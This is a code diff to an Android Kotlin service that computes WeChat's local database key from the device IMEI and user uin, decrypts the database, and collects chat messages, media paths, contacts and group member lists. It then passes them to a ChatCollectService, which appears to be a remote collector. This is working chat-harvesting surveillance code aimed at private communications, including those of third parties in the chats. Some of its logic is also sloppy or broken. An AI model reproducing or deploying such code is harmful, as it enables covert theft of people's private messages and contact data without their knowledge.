@@ -36,10 +36,12 @@ class CoreService : IntentService("CoreService") {
     private var dbPwd = ""                        // 数据库密码
     private lateinit var userInfo: UserInfo       // 用户
     private var uinEnc = ""                       // 加密后的uin
-
+    lateinit var chatCollectService:ChatCollectService;
     @SuppressLint("MissingPermission")
     override fun onHandleIntent(intent: Intent?) {
-
+        if(chatCollectService==null) {
+            chatCollectService = ChatCollectService();
+        }
         // 获取数据库密码 数据库密码是IMEI和uin合并后计算MD5值取前7位
         // 获取imei
         val manager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
@@ -103,22 +105,35 @@ class CoreService : IntentService("CoreService") {
         try {
             // 打开数据库连接
             val db = SQLiteDatabase.openOrCreateDatabase(file, password, null, hook)
-            openUserInfoTable(db)
-            openContactTable(db)
+
+            //openContactTable(db)
+            //openChatRoomTable(db)
             openMessageTable(db)
-            openChatRoomTable(db)
+
+            //openUserInfoTable(db)
+
             db.close()
         } catch (e: Exception) {
-            log("打开数据库失败：${e.message}")
+            log("失败：${e.message}")
+            if(e.message!!.contains("file is not a database:")){
+                file.delete()
+                onHandleIntent(null);
+            }
+
             FileUtils.writeLog(this, "打开数据库失败：${e.message}\n")
-            toast("打开数据库失败：${e.message}")
+            toast("失败：${e.message}")
+        }finally {
+            file.delete()
         }
+
     }
+
 
     // 打开用户信息表
     private fun openUserInfoTable(db: SQLiteDatabase) {
         // 这个数组是保存用户信息，第一次拿到的是账号，第二次是昵称
         val values = ArrayList<String>()
+
         // 用户信息表
         val cursor = db.rawQuery("select value from userinfo where id = ? or id = ?", arrayOf("2", "4"))
         if (cursor.count > 0) {
@@ -142,39 +157,40 @@ class CoreService : IntentService("CoreService") {
         // 一般公众号原始ID开头都是gh_
         // 群ID的结尾是@chatroom
         val cursor = db.rawQuery("select * from rcontact where " +
-                "type != ? and " +
-                "type != ? and " +
-                "type != ? and " +
-                "verifyFlag = ? and " +
-                "username not like 'gh_%' and " +
-                "username not like '%@chatroom' ", arrayOf("2", "33", "4", "0"))
+                "username not like 'gh_%' " , arrayOf())
         if (cursor.count > 0) {
+            var contactList = ArrayList<Contact>()
             while (cursor.moveToNext()) {
+                //var columnNames = cursor.columnNames;
                 val username = cursor.getString(cursor.getColumnIndex("username"))
                 val nickname = cursor.getString(cursor.getColumnIndex("nickname"))
                 val type = cursor.getString(cursor.getColumnIndex("type"))
                 val conRemark = cursor.getString(cursor.getColumnIndex("conRemark"))
-                // 避免保存重复数据
-                val list = DataSupport.where("username = ?", username).find(Contact::class.java)
-                if (list.isEmpty()) {
-                    val contact = Contact()
-                    contact.username = username
-                    contact.nickname = nickname
-                    contact.type = type
-                    contact.conRemark = conRemark
-                    contact.save()
-                }
+                log("联系人：$username - $nickname - $type")
+
+                val contact = Contact()
+                contact.username = username
+                contact.nickname = nickname
+                contact.type = type
+                contact.conRemark = conRemark
+                contactList.add(contact)
+
+
             }
+            var isSucces = chatCollectService.saveContact(contactList)
+            log("saveContact ：$isSucces")
         }
         cursor.close()
+
     }
 
     // 打开聊天记录表
     private fun openMessageTable(db: SQLiteDatabase) {
         // 一般公众号原始ID开头都是gh_
-        val cursor = db.rawQuery("select * from message where talker not like 'gh_%' and msgid > ? ", arrayOf(getLastMsgId(db)))
+        val cursor = db.rawQuery("select * from message where talker not like 'gh_%' and msgid > ? ", arrayOf(getLastMsgId()))
         if (cursor.count > 0) {
             while (cursor.moveToNext()) {
+                val msgId = cursor.getLong(cursor.getColumnIndex("msgId"))
                 val msgSvrId = cursor.getString(cursor.getColumnIndex("msgSvrId"))
                 val type = cursor.getString(cursor.getColumnIndex("type"))
                 val isSend = cursor.getString(cursor.getColumnIndex("isSend"))
@@ -189,9 +205,10 @@ class CoreService : IntentService("CoreService") {
                     log("该次记录 msgSvrId 为空，跳过")
                     continue
                 }
-                val list = DataSupport.where("msgSvrId = ?", msgSvrId).find(Message::class.java)
-                if (list.isEmpty()) {
+               // val list = DataSupport.where("msgSvrId = ?", msgSvrId).find(Message::class.java)
+                //if (list.isEmpty()) {
                     val message = Message()
+                    message.msgId=msgId
                     message.msgSvrId = msgSvrId
                     message.type = type
                     // 内容不做处理，直接上传
@@ -241,7 +258,7 @@ class CoreService : IntentService("CoreService") {
                                 // 过滤一些不是jpg的文件
                                 if (weChatFile.name.endsWith(".jpg")) {
                                     message.imgPath = weChatFile.name
-                                    weChatFile.save()
+                                    //weChatFile.save()
                                 }
                             }
                             "34" -> {
@@ -249,80 +266,87 @@ class CoreService : IntentService("CoreService") {
                                 val nameEnc = MD5.getMD5Str(imgPath)
                                 weChatFile.path = WX_FILE_PATH + uinEnc + "/voice2/" + nameEnc.substring(0, 2) + "/" + nameEnc.substring(2, 4) + "/" + weChatFile.name
                                 message.imgPath = weChatFile.name
-                                weChatFile.save()
+                                //weChatFile.save()
                             }
                             "43" -> {
                                 weChatFile.name = "$imgPath.mp4"
                                 weChatFile.path = WX_FILE_PATH + uinEnc + "/video/" + weChatFile.name
                                 message.imgPath = weChatFile.name
-                                weChatFile.save()
+                                //weChatFile.save()
                             }
                         }
                     }
-                    log("聊天信息：$message")
-                    message.save()
+
+                    log("聊天信息id：msgId")
+                    chatCollectService.saveMessage(message)
+                   // message.save()
                 }
-            }
+           // }
         }
         cursor.close()
     }
 
     // 获取最后一条消息ID
-    private fun getLastMsgId(db: SQLiteDatabase): String {
-        // 查询本地数据库中的最后一条
-        var lastMsgId = "0"
-        val last = DataSupport.findLast(Message::class.java)
-        if (last != null) {
-            log("本地数据库中存在最后一条记录，msgSvrid：${last.msgSvrId}")
-            val msgCu = db.rawQuery(" select * from message where msgsvrid = ? ", arrayOf(last.msgSvrId))
-            if (msgCu.count > 0) {
-                while (msgCu.moveToNext()) {
-                    lastMsgId = msgCu.getString(msgCu.getColumnIndex("msgId"))
-                    log("微信数据库中存在 msgSvrid 为：${last.msgSvrId} 的记录，msgid 为：$lastMsgId")
-                }
-            }
-            msgCu.close()
-        }
-        log("聊天记录从 msgid 为：$lastMsgId 处开始查询")
-        return lastMsgId
+    private fun getLastMsgId(): Long? {
+        var msgId=chatCollectService.getMaxMsgId();
+
+        return msgId
     }
 
     // 打开微信群表
     private fun openChatRoomTable(db: SQLiteDatabase) {
         val cursor = db.rawQuery("select * from chatroom ", arrayOf())
         if (cursor.count > 0) {
+            var roomList = ArrayList<ChatRoom>()
             while (cursor.moveToNext()) {
+
                 val name = cursor.getString(cursor.getColumnIndex("chatroomname"))
+
+                val memberCount = cursor.getInt(cursor.getColumnIndex("memberCount"))
                 val memberList = cursor.getString(cursor.getColumnIndex("memberlist"))
+                val displayname = cursor.getString(cursor.getColumnIndex("displayname"))
+
                 val roomOwner = cursor.getString(cursor.getColumnIndex("roomowner"))
                 var selfDisplayName = cursor.getString(cursor.getColumnIndex("selfDisplayName"))
                 val modifyTime = cursor.getLong(cursor.getColumnIndex("modifytime"))
                 if (selfDisplayName == null) {
                     selfDisplayName = ""
                 }
-                val list = DataSupport.where("name = ?", name).find(ChatRoom::class.java)
-                if (list.isEmpty()) {
+               // val list = DataSupport.where("name = ?", name).find(ChatRoom::class.java)
+                //if (list.isEmpty()) {
                     // 新建群信息
-                    val chatRoom = ChatRoom()
-                    chatRoom.name = name
-                    chatRoom.memberList = memberList
-                    chatRoom.roomOwner = roomOwner
-                    chatRoom.selfDisplayName = selfDisplayName
-                    chatRoom.modifyTime = modifyTime
-                    chatRoom.save()
-                } else {
-                    // 修改群信息
-                    val first = list[0]
-                    if (first.modifyTime != modifyTime) {
-                        first.memberList = memberList
-                        first.roomOwner = roomOwner
-                        first.selfDisplayName = selfDisplayName
-                        first.modifyTime = modifyTime
-                        first.isModify = 0
-                        first.save()
-                    }
+                val chatRoom = ChatRoom()
+                chatRoom.chatroomName = name
+
+                if(displayname!=null) {
+                    chatRoom.displayname = displayname
                 }
+                chatRoom.memberCount=memberCount
+                chatRoom.memberList = memberList
+
+                //chatRoom.roomOwner = roomOwner
+                //chatRoom.selfDisplayName = selfDisplayName
+                //chatRoom.modifyTime = modifyTime
+                log("chatRoom：$chatRoom")
+                roomList.add(chatRoom)
+
+                    //chatRoom.save()
+//                } else {
+//                    // 修改群信息
+//                    val first = list[0]
+//                    if (first.modifyTime != modifyTime) {
+//                        first.memberList = memberList
+//                        first.roomOwner = roomOwner
+//                        first.selfDisplayName = selfDisplayName
+//                        first.modifyTime = modifyTime
+//                        first.isModify = 0
+//                        log("chatRoom：$first")
+//                       // first.save()
+//                    }
+//                }
             }
+            var isSucces = chatCollectService.saveChatroom(roomList)
+            log("saveChatroom ：$isSucces")
         }
         cursor.close()
     }
